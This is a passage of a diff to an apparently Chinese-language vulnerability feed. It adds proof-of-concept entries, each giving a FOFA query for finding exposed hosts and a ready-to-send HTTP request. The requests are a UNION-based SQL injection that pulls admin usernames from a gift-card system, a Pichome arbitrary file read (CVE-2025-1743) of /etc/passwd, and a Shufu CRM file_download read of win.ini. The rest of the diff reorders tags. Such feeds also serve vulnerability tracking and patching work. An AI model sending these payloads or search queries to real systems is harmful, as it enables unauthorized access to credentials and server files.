id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="礼品卡电子券收卡系统parent-id存在前台存在SQL注入"><a href="#礼品卡电子券收卡系统parent-id存在前台存在SQL注入" class="headerlink" title="礼品卡电子券收卡系统parent_id存在前台存在SQL注入"></a>礼品卡电子券收卡系统parent_id存在前台存在SQL注入</h2><h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;/Application/Home/Static/css/style2.css&quot;</span><br></code></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span>  /<span class="hljs-title class_">Home</span>/<span class="hljs-title class_">Api</span>/getRegion/parent_id/<span class="hljs-number">1</span>)%20union%20select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,user_name,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>%20<span class="hljs-keyword">from</span>%20ln_admin%20where%<span class="hljs-number">20</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <br><span class="hljs-title class_">Upgrade</span>-<span class="hljs-title class_">Insecure</span>-<span class="hljs-title class_">Requests</span>: <span class="hljs-number">1</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Windows</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-number">10.0</span>; <span class="hljs-title class_">Win64</span>; x64) <span class="hljs-title class_">AppleWebKit</span>/<span class="hljs-number">537.36</span> (<span class="hljs-variable constant_">KHTML</span>, like <span class="hljs-title class_">Gecko</span>) <span class="hljs-title class_">Chrome</span>/<span class="hljs-number">136.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-title class_">Safari</span>/<span class="hljs-number">537.36</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Referer: http://127.0.0.1:8066/</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Cookie: think_language=zh-CN; PHPSESSID=p4d3rprbojktlbnfhrd9gv1gk4</span><br><span class="hljs-comment">Connection: keep-alive</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Pichome 任意文件读取漏洞</title>
+    <link href="/2025/06/11/github_1387029998/"/>
+    <url>/2025/06/11/github_1387029998/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Pichome 任意文件读取漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-1743</li></ul><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Pichome接口index存在任意文件读取漏洞，攻击者可以通过构造特定的HTTP请求读取服务器上的任意文件，如&#x2F;etc&#x2F;passwd，可能导致敏感信息泄露。</p><p><strong>产品名称：</strong> Pichome</p><p><strong>搜索语法：</strong> title&#x3D;”PicHome”</p><p><strong>来源：</strong> <a href="https://github.com/eeeeeeeeee-code/POC/blob/1d0e69bc334b8f07449d8e1940bf23a76455ad18/wpoc%2FPichome%2FPichome%E6%8E%A5%E5%8F%A3index%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96(CVE-2025-1743).md">https://github.com/eeeeeeeeee-code/POC/blob/1d0e69bc334b8f07449d8e1940bf23a76455ad18/wpoc%2FPichome%2FPichome%E6%8E%A5%E5%8F%A3index%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96(CVE-2025-1743).md</a></p><p><strong>类型：</strong> eeeeeeeeee-code&#x2F;POC:github commit</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Pichome接口index存在任意文件读取-CVE-2025-1743"><a href="#Pichome接口index存在任意文件读取-CVE-2025-1743" class="headerlink" title="Pichome接口index存在任意文件读取(CVE-2025-1743)"></a>Pichome接口index存在任意文件读取(CVE-2025-1743)</h2><h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">title</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;PicHome&quot;</span><br></code></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span> /index.<span class="hljs-property">php</span>?mod=textviewer&amp;src=<span class="hljs-attr">file</span>:<span class="hljs-comment">///etc/passwd HTTP/1.1</span><br><span class="hljs-title class_">Host</span>:<br><span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Language</span>: zh-<span class="hljs-variable constant_">CN</span>,zh;q=<span class="hljs-number">0.9</span><br><span class="hljs-title class_">Upgrade</span>-<span class="hljs-title class_">Insecure</span>-<span class="hljs-title class_">Requests</span>: <span class="hljs-number">1</span><br><span class="hljs-title class_">Cache</span>-<span class="hljs-title class_">Control</span>: max-age=<span class="hljs-number">0</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Windows</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-number">10.0</span>; <span class="hljs-title class_">WOW64</span>) <span class="hljs-title class_">AppleWebKit</span>/<span class="hljs-number">537.36</span> (<span class="hljs-variable constant_">KHTML</span>, like <span class="hljs-title class_">Gecko</span>) <span class="hljs-title class_">Chrome</span>/<span class="hljs-number">86.0</span><span class="hljs-number">.4240</span><span class="hljs-number">.198</span> <span class="hljs-title class_">Safari</span>/<span class="hljs-number">537.36</span><br><span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Encoding</span>: gzip, deflate<br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>文件读取</tag>
+      
+      <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>数夫CRM 任意文件读取漏洞</title>
+    <link href="/2025/06/11/github_1030769915/"/>
+    <url>/2025/06/11/github_1030769915/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 数夫CRM 任意文件读取漏洞</p><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 数夫CRM的file_download接口存在任意文件读取漏洞，攻击者可以通过构造特定的GET请求，读取服务器上的任意文件，如示例中的C:&#x2F;Windows&#x2F;win.ini文件。</p><p><strong>产品厂商：</strong> 数夫CRM</p><p><strong>产品名称：</strong> 数夫CRM</p><p><strong>搜索语法：</strong> icon_hash&#x3D;”-244202779”</p><p><strong>来源：</strong> <a href="https://github.com/eeeeeeeeee-code/POC/blob/6598debae03aad335162278798e20290cd9f5beb/wpoc%2F%E6%95%B0%E5%A4%ABCRM%2F%E6%95%B0%E5%A4%ABCRM%E6%8E%A5%E5%8F%A3file_download%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md">https://github.com/eeeeeeeeee-code/POC/blob/6598debae03aad335162278798e20290cd9f5beb/wpoc%2F%E6%95%B0%E5%A4%ABCRM%2F%E6%95%B0%E5%A4%ABCRM%E6%8E%A5%E5%8F%A3file_download%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md</a></p><p><strong>类型：</strong> eeeeeeeeee-code&#x2F;POC:github commit</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="数夫CRM接口file-download存在任意文件读取"><a href="#数夫CRM接口file-download存在任意文件读取" class="headerlink" title="数夫CRM接口file_download存在任意文件读取"></a>数夫CRM接口file_download存在任意文件读取</h2><h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">icon_hash</span>=<span class="hljs-string">&quot;-244202779&quot;</span><br></code></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span> /<span class="hljs-title class_">Web</span>/common/<span class="hljs-title class_">Handler</span>/file_download.<span class="hljs-property">ashx</span>?filepath=<span class="hljs-attr">C</span>:<span class="hljs-regexp">/Windows/</span>win.<span class="hljs-property">ini</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <br><span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Language</span>: zh-<span class="hljs-variable constant_">CN</span>,zh;q=<span class="hljs-number">0.8</span>,zh-<span class="hljs-variable constant_">TW</span>;q=<span class="hljs-number">0.7</span>,zh-<span class="hljs-variable constant_">HK</span>;q=<span class="hljs-number">0.5</span>,en-<span class="hljs-variable constant_">US</span>;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br><span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Encoding</span>: gzip, deflate<br><span class="hljs-title class_">Upgrade</span>-<span class="hljs-title class_">Insecure</span>-<span class="hljs-title class_">Requests</span>: <span class="hljs-number">1</span><br><span class="hljs-title class_">Priority</span>: u=<span class="hljs-number">0</span>, i<br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Windows</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-number">10.0</span>; <span class="hljs-title class_">Win64</span>; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">138.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">138.0</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>文件读取</tag>
+      
+      <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>【已复现】契约锁电子签章系统远程代码执行漏洞</title>
     <link href="/2025/06/11/weixin_2219215688/"/>
     <url>/2025/06/11/weixin_2219215688/</url>
@@ -128,9 +344,9 @@
     
     <tags>
       
-      <tag>SQL注入</tag>
-      
       <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+      <tag>SQL注入</tag>
       
     </tags>
     
@@ -155,9 +371,9 @@
     
     <tags>
       
-      <tag>SQL注入</tag>
-      
       <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+      <tag>SQL注入</tag>
       
     </tags>
     
@@ -182,9 +398,9 @@
     
     <tags>
       
-      <tag>服务器端请求伪造</tag>
-      
       <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+      <tag>服务器端请求伪造</tag>
       
     </tags>
     
@@ -3666,9 +3882,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>文件读取</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4960,9 +5176,9 @@
     
     <tags>
       
-      <tag>CVE-2024:github search</tag>
-      
       <tag>文件读取</tag>
+      
+      <tag>CVE-2024:github search</tag>
       
     </tags>
     
@@ -5446,9 +5662,9 @@
     
     <tags>
       
-      <tag>CVE-2024:github search</tag>
-      
       <tag>SQL注入</tag>
+      
+      <tag>CVE-2024:github search</tag>
       
     </tags>
     
@@ -6875,9 +7091,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>文件读取</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -9141,9 +9357,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>文件读取</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
